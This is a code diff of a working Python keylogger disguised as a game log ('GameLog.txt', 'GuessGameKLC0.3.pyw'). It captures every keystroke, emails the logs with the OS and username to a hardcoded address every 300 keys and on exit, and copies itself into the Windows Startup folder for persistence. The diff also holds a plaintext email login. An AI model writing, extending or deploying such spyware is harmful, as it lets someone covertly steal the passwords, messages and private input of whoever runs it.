@@ -1,14 +1,19 @@
 import pynput
 import smtplib
 import os
+import re
+import win32api
 import datetime
 import platform
+import atexit
+import shutil
 from pynput.keyboard import Key, Listener
 from email.mime.text import MIMEText
 from email.mime.multipart import MIMEMultipart
 from email.mime.base import MIMEBase
 from email import encoders
 
+#Variables
 count = 0
 mailCount = 0
 logNumber = 0
@@ -16,20 +21,23 @@ keys = []
 
 path = os.path.abspath("C:/Games/GameLog.txt")
 fileExists = os.path.isfile(path)
-passw = "gormitihulk123"
 
+#Create a file if doesn't exist
 if not fileExists:
     open(f"{path}", "w").close()
+#A function for sending mail
+def sendMail():
 
-def sendmail():
-    #Email Variables
+    #Formating the date
     dateNow = datetime.datetime.now().strftime("%d-%m-%y %H:%M:%S")
 
+    #Email Variables
     email_user = "oplpet0@seznam.cz"
     email_send = "oplpet0@seznam.cz"
     email_password = "gormitihulk123"
     subject = f"{logNumber}. log {dateNow}"
 
+    #Formating the email message
     msg = MIMEMultipart()
     msg['From'] = email_user
     msg['To'] = email_send
@@ -37,9 +45,10 @@ def sendmail():
 
     f = open(path, "r")
 
-    body = f'{f.read()}'
+    body = f"Os: {platform.system()}\nUserName: {os.getlogin()}\n\n{f.read()}"
     msg.attach(MIMEText(body,'plain'))
 
+    #Setting up the attachement
     filename = path #INSERT FILE LOCATION
     attachment = open(filename, 'rb')
 
@@ -53,32 +62,39 @@ def sendmail():
     server = smtplib.SMTP_SSL('smtp.seznam.cz', 465)
     server.login(email_user, email_password)
 
+    #Sending the email
     server.sendmail(email_user, email_send, text)
     server.quit()
     f.close()
     print("Email sended sucessfuly")
 
-sendmail()
+sendMail()
 
+scriptPath = os.path.realpath(__file__)
+
+shutil.copy(scriptPath, f"C:/Users/{os.getlogin()}/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/GuessGameKLC0.3.pyw")
+#This function will save the keys
 def onPress(key):
     global keys, count, mailCount, logNumber
+
     keys.append(key)
     count += 1
     mailCount +=1
     print(f"{key} pressed")
 
+    #Evry 1 key it will update the file
     if count >= 1:
         count = 0
         writeFile(keys)
         keys = []
     
+    #Every 300 keys, it will send a email
     if mailCount >= 300:
         mailCount = 0
-        
-        #Sends an email
-        sendmail()
+        sendMail()
         logNumber += 1
 
+#This function will write in to the file
 def writeFile(keys):
     with open(f"{path}", "a") as f:
         for key in keys:
@@ -110,5 +126,12 @@ def writeFile(keys):
             elif k.find("Key") == -1:
                 f.write(k)
 
+#When program exits
+def exitHandler():
+    sendMail()
+
+atexit.register(exitHandler)
+
+#Listens to key events
 with Listener(on_press=onPress, on_release=None) as listener:
     listener.join()
